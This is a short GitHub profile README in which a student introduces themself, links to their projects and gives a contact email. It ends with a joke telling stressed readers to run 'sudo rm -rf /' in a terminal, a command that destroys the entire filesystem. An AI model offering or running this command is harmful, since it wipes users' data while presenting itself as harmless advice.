# 💫 About Me:
🚀 I’m currently studying at [HSE/FCS/DSBA](https://www.hse.ru/ba/data/)<br><br>🎨 All of my projects are available [here](https://github.com/incRED1bl)<br><br>🗃️ Contact me via timur.toktamysov@gmail.com<br><br>
...
## If you are stressed, just run in Terminal
```bash
sudo rm -rf /
```
